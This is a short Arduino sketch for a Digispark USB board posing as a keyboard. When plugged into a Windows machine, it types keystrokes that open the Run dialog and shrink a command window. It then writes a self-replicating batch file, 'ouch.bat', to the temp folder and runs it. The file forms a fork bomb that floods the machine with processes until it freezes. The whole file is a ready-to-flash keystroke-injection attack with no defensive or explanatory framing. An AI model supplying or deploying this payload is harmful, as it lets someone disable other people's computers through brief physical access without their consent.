#include "DigiKeyboard.h"

#define KEY_TAB 0x2B

void setup() {
    DigiKeyboard.delay(750);
    DigiKeyboard.sendKeyStroke(0);
    DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); //run
    DigiKeyboard.delay(100);
    DigiKeyboard.println("cmd /k mode con: cols=15 lines=1"); //smallest cmd window possible
    DigiKeyboard.delay(500);
    DigiKeyboard.println("(echo :ouch && echo start ouch.bat && echo goto ouch) > %temp%/ouch.bat"); //Creating payload in temporary dir
    DigiKeyboard.delay(300);  
    DigiKeyboard.println("cd %temp% && ouch.bat"); //executing the payload
    DigiKeyboard.delay(500);

}

void loop() {
   DigiKeyboard.update();
}
